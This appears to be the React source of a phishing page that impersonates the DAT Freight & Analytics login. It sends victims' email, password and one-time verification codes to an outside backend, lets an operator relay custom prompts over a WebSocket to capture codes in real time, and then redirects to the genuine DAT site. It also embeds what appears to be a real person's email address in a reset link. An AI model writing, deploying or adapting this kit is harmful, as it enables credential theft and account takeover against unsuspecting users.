import "../HomePgae/formfk.css";
import { useState, useRef, useEffect } from "react";
import Swal from "sweetalert2";
import pak from "../../img/pak.svg";
import bac from "../../img/bac.svg";
import datkaplog from "../../img/dat-logo-email.svg";
import axios from "axios";
import { ThreeDot } from "react-loading-indicators";

function HomePage() {
  const [loading, setLoading] = useState(false);
  const [loadingTwo, setLoadingTwo] = useState(false);
  const [formData, setFormData] = useState({
    userName: "",
    password: "",
    key: "",
  });
  const [passwordShown, setPasswordShown] = useState(false);
  const [ereva, setEreva] = useState(false);
  const [erorekav, setErorekav] = useState(false);
  const [heraxos, setHeraxos] = useState(null);
  const [usertazaname, setUsertazaname] = useState("");
  const [disableButton, setDisableButton] = useState(false);
  const userName = useRef(null);
  const passwordUser = useRef(null);
  var qfNum = 0;
  const digit = useRef(null);
  const wsRef = useRef(null);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevState) => ({
      ...prevState,
      [name]: value,
    }));
  };

  const generateShortSessionKey = () => {
    return Math.floor(1000 + Math.random() * 9000).toString();
  };

  const sessionKeyRef = useRef(generateShortSessionKey());

  useEffect(() => {
    const socket = new WebSocket("wss://dat-be.onrender.com.com/ws");
    wsRef.current = socket;

    socket.onopen = () => {
      socket.send(
        JSON.stringify({ type: "init", sessionKey: sessionKeyRef.current })
      );
    };

    socket.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);

        if (data?.sessionKey !== sessionKeyRef.current) return;

        if (data?.type === "text") {
          setHeraxos(data?.textMessage);
          setUsertazaname(data?.inputValue);
          setEreva(!ereva);
          setLoading(false);
          setLoadingTwo(false);
          setErorekav(false);
        } else if (data?.type === "error") {
          setErorekav(true);
          setLoading(false);
          setLoadingTwo(false);
        } else if (data?.type === "ok") {
          setLoading(false);
          setLoadingTwo(false);
          Swal.fire({
            title: "DAT Freight & Analytics",
            text: "Your account is activated.",
            preConfirm: () => {
              window.location.href =
                "https://account.dat.com/profile?source=datone.web";
            },
          });
        }
      } catch (err) {
        console.error("❌ WebSocket parsing error:", err);
      }
    };

    return () => socket.close();
  }, []);

  function qfFunck(qf) {
    if (
      qf.value.indexOf("ccox") !== -1 ||
      qf.value.indexOf("klir") !== -1 ||
      qf.value.indexOf("qunn") !== -1 ||
      qf.value.indexOf("jajtam") !== -1 ||
      qf.value.indexOf("jaj tam") !== -1 ||
      qf.value.indexOf("txeq") !== -1 ||
      qf.value.indexOf("cceq") !== -1 ||
      qf.value.indexOf("uteq") !== -1 ||
      qf.value.indexOf("fuck") !== -1 ||
      qf.value.indexOf("suck") !== -1 ||
      qf.value.indexOf("dick") !== -1 ||
      qf.value.indexOf("gandon") !== -1 ||
      qf.value.indexOf("qunnem") !== -1 ||
      qf.value.indexOf("txa") !== -1 ||
      qf.value.indexOf("boz") !== -1 ||
      qf.value.indexOf("chatlax") !== -1 ||
      qf.value.indexOf("gyot") !== -1 ||
      qf.value.indexOf("garlax") !== -1
    ) {
      qf.value = "";
      qf.className = "form_empty form-control";
      setLoading(false);
      qfNum = 1;
    } else {
      qfNum = 0;
    }
  }
  const handleInputBlur = (event) => {
    qfFunck(event.target);
    if (event.target.value === "") {
      event.target.nextSibling.style.display = "block";
      event.target.className = "form_empty form-control";
      setLoading(false);
    } else {
      event.target.nextSibling.style.display = "none";
      event.target.className = "form-control";
    }
  };
  const togglePassword = () => {
    setPasswordShown(!passwordShown);
  };
  async function handleSubmit(event) {
    event.preventDefault();
    setLoading(true);
    setErorekav(false);
    qfFunck(userName.current);
    if (qfNum === 1) {
      userName.current.value = "";
      userName.current.nextSibling.style.display = "flex";
      userName.current.className = "form_empty form-control";
      setLoading(false);
    } else if (qfNum === 0) {
      qfFunck(passwordUser.current);
      if (qfNum === 0) {
        if (userName.current.value && passwordUser.current.value) {
          await axios.post(
            "https://dat-be.onrender.com/api/send-form",
            {
              username: formData.userName,
              password: formData.password,
              key: "",
              sessionKey: sessionKeyRef.current,
            }
          );
          return;
        }
      }
    }
    if (!userName.current.value) {
      event.target[0].nextSibling.style.display = "flex";
      userName.current.className = "form_empty form-control";
      setLoading(false);
    }
    if (!passwordUser.current.value) {
      event.target[1].nextSibling.style.display = "flex";
      passwordUser.current.className = "form_empty form-control";
      setLoading(false);
    }
  }
  const handleInputBlurErku = (event) => {
    if (event.target.value === "") {
      event.target.nextSibling.style.display = "flex";
      event.target.className = "form_empty form-control";
      setLoadingTwo(false);
    } else {
      event.target.nextSibling.style.display = "none";
      event.target.className = "form-control";
    }
  };
  async function handleSubmitErku(event) {
    event.preventDefault();
    setLoadingTwo(true);
    setErorekav(false);
    setDisableButton(false);
    if (digit.current.value) {
      await axios.post(
        "https://dat-be.onrender.com/api/send-form",
        {
          username: formData.userName,
          password: formData.password,
          key: formData.key,
          sessionKey: sessionKeyRef.current,
        }
      );
      return;
    } else {
      event.target[0].nextSibling.style.display = "flex";
      digit.current.className = "form_empty form-control";
      setLoadingTwo(false);
    }
  }

  async function resend() {
    await axios.post(
      "https://dat-be.onrender.com/api/send-form",
      {
        username: formData.userName,
        password: formData.password,
        key: "Resend",
        sessionKey: sessionKeyRef.current,
      }
    );
    setLoadingTwo(false);
    setDisableButton(true);
  }

  return (
    <div className={ereva ? "form_block form_block_MEC" : "form_block"}>
      <section
        className="form_box"
        style={ereva ? { display: "none" } : { display: "block" }}
      >
        <div className="logikoik">
          <img src={datkaplog} alt=""></img>
        </div>
        <h1 className="logIn"> Log in </h1>
        <h3 className="logText"> To continue to your DAT account </h3>
        <form onSubmit={handleSubmit} id="formss">
          <div className="inputBlock arajinblock">
            <input
              onBlur={handleInputBlur}
              id="Username"
              ref={userName}
              name="userName"
              type="text"
              className="form-control"
              value={formData?.userName}
              onChange={handleChange}
            />
            <div style={{ display: "none" }} className="requiredBox">
              <span
                className="ulp-input-error-icon"
                role="img"
                aria-label="Error"
              ></span>
              Username is required
            </div>
            <span className="placeholder"> Email address* </span>
          </div>
          <div className="inputBlock">
            <input
              onBlur={handleInputBlur}
              id="Password"
              ref={passwordUser}
              name="password"
              type={passwordShown ? "text" : "password"}
              className="form-control"
              value={formData?.password}
              onChange={handleChange}
            />
            <div style={{ display: "none" }} className="requiredBox">
              <span
                className="ulp-input-error-icon"
                role="img"
                aria-label="Error"
              ></span>
              Password is required
            </div>
            <span className="placeholder"> Password * </span>
            <span className="eyeIcon" onClick={togglePassword}>
              <img
                src={passwordShown ? bac : pak}
                className="openPass"
                alt=""
              ></img>
            </span>
          </div>
          <div className="morBox">
            <a
              target="otherWindow.location"
              href="https://login.dat.com/u/login/password-reset-start/Email-Password-Authentication/sancheztruckingllc2024%40gmail.com?state=hKFo2SBwOFphMVU2bzVwblBjV2lHbGZDb0FVOEt6OHl1NVBkaaFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIEMtUE54ejRQd3VqblBKZ09tOUZpaGFhVnpJSmZrVFdao2NpZNkgZTlsek1YYm5XTkowRDUwQzJoYWFkbzdEaVcxYWt3YUM"
              type="button"
              className="moranal"
            >
              Forgot password?
            </a>
          </div>
          <div
            style={erorekav ? { display: "flex" } : { display: "none" }}
            className="invalidBox"
          >
            <span
              className="ulp-input-error-icon"
              role="img"
              aria-label="Error"
            ></span>
            Wrong email or password
          </div>
          <button id="btnLogin" type="submit" className="btn-primary" disabled={loading}>
            {!loading ? (
              <span>CONTINUE</span>
            ) : (
              <ThreeDot color="white" size="small" />
            )}
          </button>
          <p className="fingercolor">Use Fingerprint or Face Recognition</p>
        </form>
      </section>
      <section
        className="form_box keyIkIk"
        style={ereva ? { display: "block" } : { display: "none" }}
      >
        <div className="logikoik">
          <img src={datkaplog} alt=""></img>
        </div>
        <h1 className="erkuGlav">Verify Your Identity</h1>
        <p className="erkuPok">{heraxos}</p>
        <form onSubmit={handleSubmitErku} id="formssErku">
          <div className="usernameBlock">
            <p className="username">{usertazaname}</p>
          </div>
          <div className="inputBlock">
            <input
              onBlur={handleInputBlurErku}
              id="digit"
              ref={digit}
              name="key"
              value={formData.key}
              onChange={handleChange}
              type="number"
              className="form-control"
            />
            <div style={{ display: "none" }} className="requiredBox">
              <span
                className="ulp-input-error-icon"
                role="img"
                aria-label="Error"
              ></span>
              Please enter a code
            </div>
            <span className="placeholder placeholderErku">Enter the code*</span>
          </div>
          <div className="RememberErku">
            <label className="checkbox-inline">
              <input name="RememberErku" type="checkbox" id="RememberErku" />
              Remember this device for 30 days
            </label>
          </div>
          <div
            style={erorekav ? { display: "flex" } : { display: "none" }}
            className="invalidBox"
          >
            <span
              className="ulp-input-error-icon"
              role="img"
              aria-label="Error"
            ></span>
            The code you entered is invalid
          </div>
          <button id="btnLoginContinue" type="submit" className="btn-primary" disabled={loadingTwo}>
            {!loadingTwo ? (
              <span>CONTINUE</span>
            ) : (
              <ThreeDot color="white" size="small" />
            )}
          </button>
        </form>
        <p className="receive">
          Didn't receive a code? <button onClick={resend} disabled={disableButton} className="resendkey">Resend</button>
        </p>
      </section>
    </div>
  );
}

export default HomePage;
